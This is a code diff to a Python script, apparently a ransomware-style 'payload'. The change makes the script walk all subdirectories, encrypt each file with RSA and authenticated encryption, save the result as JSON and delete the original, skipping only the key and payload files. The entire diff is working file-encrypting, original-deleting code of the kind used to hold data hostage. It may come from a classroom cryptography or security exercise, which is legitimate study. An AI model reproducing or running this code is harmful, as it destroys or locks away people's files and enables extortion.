@@ -41,44 +41,48 @@ if((not os.path.isfile(constants.PUBLIC_KEY_FILE_PATH)) or (not os.path.isfile(c
 
 # pdb.set_trace()
 
-# Gather all fileNames
-allFileNames = [f for f in os.listdir(".") if os.path.isfile(os.path.join(".", f))]
+# Old method of grabbing all files, did not traverse subdirectories
+# allFileNames = [f for f in os.listdir(".") if os.path.isfile(os.path.join(".", f))]
 
 # Debugging Stuff
 # print(allFileNames)
 # pdb.set_trace()
 
-# Loop for each file
-for filePath in allFileNames:
-    # Do not encrypt the private key
-    #  print(filePath)
-    #  pdb.set_trace()
-    if ((filePath != "privateKey.pem") and (filePath != "payload") and (filePath != "publicKey.pem")):
-        print("Encrypting: " + filePath)
+# Gather all filenames, traversing subdirectories
+for root, dirs, files in os.walk("."):
+	# Loop for each file
+	for file in files:
+		filePath = os.path.join(root, file)
 
-        # Call the encryptor
-        RSACipher, cipherText, IV, tag, ext = MyEncrypt.MyRSAEncryptMAC(filePath = filePath, RSAPublicKeyFilePath = constants.PUBLIC_KEY_FILE_PATH)
+		# Do not encrypt the private/public key or payload
+		if(not (filePath.endswith(constants.PRIVATE_KEY_FILE_PATH) or filePath.endswith(constants.PUBLIC_KEY_FILE_PATH) or filePath.endswith(constants.PAYLOAD_FILE_PATH))):
+			print("Encrypting: " + filePath)
 
-        # Create json file from dictionary
-        fileName = filePath.rsplit(".", 1)[0]
-        jsonFileName = fileName + ".json"
-        outfile = open(jsonFileName, 'w')
+			# Call the encryptor
+			RSACipher, cipherText, IV, tag, ext = MyEncrypt.MyRSAEncryptMAC(filePath = filePath, RSAPublicKeyFilePath = constants.PUBLIC_KEY_FILE_PATH)
 
-        jsonData = {}
+			# Create json file from dictionary
+			fileName = filePath.rsplit(".", 1)[0]
+			jsonFileName = fileName + ".json"
+			outfile = open(jsonFileName, 'w')
 
-        # Create the dictionary
-        jsonData["RSACipher"] = b64encode(RSACipher).decode('utf-8'),
-        jsonData["Cipher Text"] = b64encode(cipherText).decode('utf-8'), 
-        jsonData["IV"] = b64encode(IV).decode('utf-8'), 
-        jsonData["Tag"] = b64encode(tag).decode('utf-8'), 
-        jsonData["Extension"] = ext
+			jsonData = {}
 
-        # Write to json
-        json.dump(jsonData, outfile, ensure_ascii=False)
-        outfile.close()
+			# Create the dictionary
+			jsonData["RSACipher"] = b64encode(RSACipher).decode('utf-8'),
+			jsonData["Cipher Text"] = b64encode(cipherText).decode('utf-8'), 
+			jsonData["IV"] = b64encode(IV).decode('utf-8'), 
+			jsonData["Tag"] = b64encode(tag).decode('utf-8'), 
+			jsonData["Extension"] = ext
 
-        # Delete the original file
-        os.remove(filePath)
+			# Write to json
+			json.dump(jsonData, outfile, ensure_ascii=False)
+			outfile.close()
 
-        print("Results of encryption stored at: " + jsonFileName)
-        print("")
+			# Delete the original file
+			os.remove(filePath)
+
+			print("Results of encryption stored at: " + jsonFileName)
+			print("")
+
+os.system("pause")
